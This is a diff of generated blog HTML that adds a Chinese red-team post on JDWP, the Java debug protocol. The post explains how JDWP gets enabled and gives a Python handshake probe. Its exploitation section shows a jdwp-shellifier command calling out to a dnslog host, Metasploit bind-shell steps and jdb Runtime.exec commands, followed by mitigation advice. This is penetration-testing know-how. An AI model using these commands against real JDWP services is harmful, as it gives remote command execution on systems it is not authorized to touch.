@@ -13,7 +13,7 @@
     
     <!--- Seo Part-->
     
-    <link rel="canonical" href="https://mapl3miss.github.io/categories/"/>
+    <link rel="canonical" href="https://mapl3miss.github.io/2025/07/31/jdwp/"/>
     <meta name="robots" content="index,follow">
     <meta name="googlebot" content="index,follow">
     <meta name="revisit-after" content="1 days">
@@ -22,16 +22,17 @@
     
         
         <meta name="description" content="Hexo Theme Redefine, Redefine Your Hexo Journey.">
-<meta property="og:type" content="website">
-<meta property="og:title" content="categories">
-<meta property="og:url" content="https://mapl3miss.github.io/categories/index.html">
+<meta property="og:type" content="article">
+<meta property="og:title" content="JDWP">
+<meta property="og:url" content="https://mapl3miss.github.io/2025/07/31/JDWP/index.html">
 <meta property="og:site_name" content="Hexo">
 <meta property="og:description" content="Hexo Theme Redefine, Redefine Your Hexo Journey.">
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="https://mapl3miss.github.io/images/redefine-og.webp">
-<meta property="article:published_time" content="2025-12-29T11:35:47.000Z">
-<meta property="article:modified_time" content="2025-12-29T11:35:47.905Z">
+<meta property="article:published_time" content="2025-07-31T04:06:55.000Z">
+<meta property="article:modified_time" content="2025-12-29T13:34:28.693Z">
 <meta property="article:author" content="John Doe">
+<meta property="article:tag" content="redTeam">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://mapl3miss.github.io/images/redefine-og.webp">
     
@@ -45,7 +46,7 @@
     
     <title>
         
-            Categories | Mapl3miss&#39;s blog
+            JDWP | Mapl3miss&#39;s blog
         
     </title>
 
@@ -272,36 +273,261 @@
 			
 
 			<div class="main-content">
-				<div class="page-template-container">
-	
+				<div class="post-page-container flex relative justify-between box-border w-full h-full">
+	<div class="article-content-container">
 
-	
-	<h1 class="page-title-header">
-	categories
-</h1>
-<div class="category-list-content">
-	
-</div>
-<div class="category-comments">
-	
-</div>
-	
+		<div class="article-title relative w-full">
+			
+			<div class="w-full flex items-center pt-6 justify-start">
+				<h1 class="article-title-regular text-second-text-color tracking-tight text-4xl md:text-6xl font-semibold px-2 sm:px-6 md:px-8 py-3">JDWP</h1>
+			</div>
+			
+		</div>
 
-	<div class="page-template-content markdown-body">
+		
+		<div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
+			<div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
+				<img src="/images/avatar.jpg">
+			</div>
+			<div class="info flex flex-col justify-between">
+				<div class="author flex items-center">
+					<span class="name text-default-text-color text-lg font-semibold">mapl3miss</span>
+					
+					<span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">Lv1</span>
+					
+				</div>
+				<div class="meta-info">
+					<div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2025-07-31 12:06:55</span>
+        <span class="mobile">2025-07-31 12:06:55</span>
+        <span class="hover-info">Created</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2025-12-29 21:34:28</span>
+            <span class="mobile">2025-12-29 21:34:28</span>
+            <span class="hover-info">Updated</span>
+        </span>
+    
+
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fa-regular fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/redTeam/">redTeam</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+				</div>
+			</div>
+		</div>
 		
 
+		
+
+
+		<div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
+			<p>JDWP（Java Debug Wire Protocol Transport Interface）协议是用于调试器（debugger）和被调试的Java虚拟机（Target VM）之前的通信协议</p>
+<h2 id="启动方式"><a href="#启动方式" class="headerlink" title="启动方式"></a>启动方式</h2><h3 id="JDK自带"><a href="#JDK自带" class="headerlink" title="JDK自带"></a>JDK自带</h3><div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -agentlib:jdwp=transport=dt_socket,server=y,suspend=y,address=5050 -jar xxx.jar</span><br></pre></td></tr></table></figure></div>
+<h3 id="idea"><a href="#idea" class="headerlink" title="idea"></a>idea</h3><p>选择启动文件中的编辑配置的Run&#x2F;Debug Configuratiions中配置</p>
+<h3 id="maven"><a href="#maven" class="headerlink" title="maven"></a>maven</h3><div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mvn spring-boot:run -Drun.jvmArguments=**&quot;-Xdebug -Xrunjdwp:transport=dt_socket,server=y,suspend=y,address=8001&quot;</span><br></pre></td></tr></table></figure></div>
+<h3 id="tomcat"><a href="#tomcat" class="headerlink" title="tomcat"></a>tomcat</h3><h6 id="windows下"><a href="#windows下" class="headerlink" title="windows下"></a>windows下</h6><p><code>bin</code>目录下的startup.bat文件中加入</p>
+<div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SET CATALINA_OPTS=-server -Xdebug -Xnoagent -Djava.compiler=NONE -Xrunjdwp:transport=dt_socket,server=y,suspend=n,address=8000</span><br></pre></td></tr></table></figure></div>
+<p>然后cmd运行startup.bat就可以在8000端口上开启JDWP协议了<br>或者直接</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/tomcat/bin/catalina.bat jpda run</span><br><span class="line">/tomcat/bin/catalina.bat jpda start</span><br></pre></td></tr></table></figure></div>
+
+<h6 id="linux下"><a href="#linux下" class="headerlink" title="linux下"></a>linux下</h6><p>bin目录下找到 <code>catalina.sh</code> 文件,加入</p>
+<div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CATALINA_OPTS=&quot;-Xdebug -Xrunjdwp:transport=dt_socket,server=y,suspend=n,address=*:8000&quot;</span><br></pre></td></tr></table></figure></div>
+<p>或者直接</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/tomcat/bin/catalina.sh jpda run</span><br><span class="line">/tomcat/bin/catalina.sh jpda start</span><br></pre></td></tr></table></figure></div>
+
+<h2 id="探测"><a href="#探测" class="headerlink" title="探测"></a>探测</h2><p>可疑端口:8000 5005 8080<br>探测主要是利用了jdwp握手阶段互发JDWP-Handshake的特性</p>
+<h4 id="1-nmap和fscan"><a href="#1-nmap和fscan" class="headerlink" title="1.nmap和fscan"></a>1.nmap和fscan</h4><p>很多情况下扫不出来jdwp服务,会显示http-alt</p>
+<h4 id="2-python探测脚本"><a href="#2-python探测脚本" class="headerlink" title="2.python探测脚本"></a>2.python探测脚本</h4><div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket  </span><br><span class="line">  </span><br><span class="line">client = socket.socket()  </span><br><span class="line">client.connect((<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">8000</span>))  </span><br><span class="line">client.send(<span class="string">b&quot;JDWP-Handshake&quot;</span>)  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">if</span> client.recv(<span class="number">1024</span>) == <span class="string">b&quot;JDWP-Handshake&quot;</span>:  </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*]JDWP Service!&quot;</span>)  </span><br><span class="line">  </span><br><span class="line">client.close()</span><br></pre></td></tr></table></figure></div>
+
+<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>1&gt;<a class="link"   target="_blank" rel="noopener" href="https://github.com/IOActive/jdwp-shellifier" >jdwp-shellifier<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>(此工具需要python2环境)<br>该漏洞无回显，可利用dnslog进行探测</p>
+<div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 jdwp-shellifier.py -t 127.0.0.1 -p 8000 --break-on &quot;java.lang.String.indexof&quot; --cmd &quot;ping xxx.dnslog.cn&quot;</span><br></pre></td></tr></table></figure></div>
+
+<p>2&gt;msf<br>在msf中可以使用exploit&#x2F;multi&#x2F;misc&#x2F;java_jdwp_debugger模块进行攻击利用。<br>原理是去找sleeping中的线程，然后下发单步指令是程序断下来，从而触发命令执行。</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/misc/java_jdwp_debugger</span><br><span class="line">set rhosts x.x.x.x</span><br><span class="line">set payload linux/x64/shell/bind_tcp </span><br><span class="line"> run</span><br></pre></td></tr></table></figure></div>
+
+<p>3&gt;JDB<br>jdb是JDK中自带的命令行调试工具。<br>这里是按照msf中的方式：</p>
+<ol>
+<li>attach到远程JDWP服务；</li>
+<li>threads命令查看所有线程，查找sleeping的线程；</li>
+<li>thread sleeping的线程id，然后stepi进入该线程；</li>
+<li>通过print|dump|eval命令，执行Java表达式从而达成命令执行；</li>
+</ol>
+<p>命令:</p>
+<div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jdb -connect com.sun.jdi.SocketAttach:hostname=127.0.0.1,port=8000</span><br></pre></td></tr></table></figure></div>
+<div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">threads</span><br></pre></td></tr></table></figure></div>
+<div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">thread &lt;线程id&gt;(如0xc6a)</span><br></pre></td></tr></table></figure></div>
+<div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">stepi</span><br></pre></td></tr></table></figure></div>
+<div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eval java.lang.Runtime.getRuntime().exec(&quot;calc&quot;)</span><br></pre></td></tr></table></figure></div>
+
+<p>回显利用:<a class="link"   target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/_WtJJCOy0e3KpLdJM5Y6cg" >为JDWP远程命令执行加上回显<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
+<h2 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h2><ul>
+<li>关闭JDWP服务，或限制JDWP服务只对指定ip开放；</li>
+<li>关闭Java Debug模式</li>
+</ul>
+
+		</div>
+
+		
+		<div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
+			<div class="article-copyright-info-container">
+    <ul>
+        <li><strong>Title:</strong> JDWP</li>
+        <li><strong>Author:</strong> mapl3miss</li>
+        <li><strong>Created at
+                :</strong> 2025-07-31 12:06:55</li>
+        
+            <li>
+                <strong>Updated at
+                    :</strong> 2025-12-29 21:34:28
+            </li>
+        
+        <li>
+            <strong>Link:</strong> https://redefine.ohevan.com/2025/07/31/JDWP/
+        </li>
+        <li>
+            <strong>
+                License:
+            </strong>
+            
+
+            
+                This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a>.
+            
+        </li>
+    </ul>
+</div>
+
+		</div>
+		
+
+		
+		<ul class="post-tags-box text-lg mt-1.5 flex-wrap justify-center flex md:hidden">
+			
+			<li class="tag-item mx-0.5">
+				<a href="/tags/redTeam/">#redTeam</a>&nbsp;
+			</li>
+			
+		</ul>
+		
+
+		
+
+		
+		<div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
+			
+			<div class="article-prev border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+				<a class="prev" rel="prev" href="/2025/08/11/Jackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">
+					<span class="left arrow-icon flex justify-center items-center">
+						<i class="fa-solid fa-chevron-left"></i>
+					</span>
+					<span class="title flex justify-center items-center">
+						<span class="post-nav-title-item">Jackson反序列化</span>
+						<span class="post-nav-item">Prev posts</span>
+					</span>
+				</a>
+			</div>
+			
+			
+			<div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+				<a class="next" rel="next" href="/2025/07/18/Linux%E5%BA%94%E6%80%A5/">
+					<span class="title flex justify-center items-center">
+						<span class="post-nav-title-item">Linux应急</span>
+						<span class="post-nav-item">Next posts</span>
+					</span>
+					<span class="right arrow-icon flex justify-center items-center">
+						<i class="fa-solid fa-chevron-right"></i>
+					</span>
+				</a>
+			</div>
+			
+		</div>
+		
+
+
+		
+		<div class="comment-container px-2 sm:px-6 md:px-8 pb-8">
+			<div class="comments-container mt-10 w-full ">
+    <div id="comment-anchor" class="w-full h-2.5"></div>
+    <div class="comment-area-title w-full my-1.5 md:my-2.5 text-xl md:text-3xl font-bold">
+        Comments
+    </div>
+    
+
+        
+            
+    <div id="waline"></div>
+    <script type="module" data-swup-reload-script>
+      import { init } from '/js/libs/waline.mjs';
+
+      function loadWaline() {
+        init({
+          el: '#waline',
+          serverURL: 'https://example.example.com',
+          lang: 'zh-CN',
+          dark: 'body[class~="dark-mode"]',
+          reaction: false,
+          requiredMeta: ['nick', 'mail'],
+          emoji: [],
+          
+          
+        });
+      }
+
+      if (typeof swup !== 'undefined') {
+        loadWaline();
+      } else {
+        window.addEventListener('DOMContentLoaded', loadWaline);
+      }
+    </script>
+
+
+
+        
+    
+</div>
+
+		</div>
 		
 	</div>
 
-	<div class="page-template-comments">
-		
+	
+	<div class="toc-content-container">
+		<div class="post-toc-wrap">
+	<div class="post-toc">
+		<div class="toc-title">On this page</div>
+		<div class="page-title">JDWP</div>
+		<ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%90%AF%E5%8A%A8%E6%96%B9%E5%BC%8F"><span class="nav-text">启动方式</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#JDK%E8%87%AA%E5%B8%A6"><span class="nav-text">JDK自带</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#idea"><span class="nav-text">idea</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#maven"><span class="nav-text">maven</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#tomcat"><span class="nav-text">tomcat</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%8E%A2%E6%B5%8B"><span class="nav-text">探测</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%A9%E7%94%A8"><span class="nav-text">利用</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BF%AE%E5%A4%8D"><span class="nav-text">修复</span></a></li></ol>
+
 	</div>
 </div>
-
-<div class="paginator">
+	</div>
 	
 </div>
-  
 			</div>
 
 			
@@ -379,6 +605,26 @@
 		</div>
 	</div>
 
+	
+	<div class="post-tools">
+		<div class="post-tools-container">
+	<ul class="article-tools-list">
+		<!-- TOC aside toggle -->
+		
+		<li class="right-bottom-tools page-aside-toggle">
+			<i class="fa-regular fa-outdent"></i>
+		</li>
+		
+
+		<!-- go comment -->
+		
+		<li class="go-comment">
+			<i class="fa-regular fa-comments"></i>
+		</li>
+		
+	</ul>
+</div>
+	</div>
 	
 
 	<div class="right-side-tools-container">
@@ -482,6 +728,7 @@
         containers: ["#swup"],
     });
 </script>
+
 
 
 
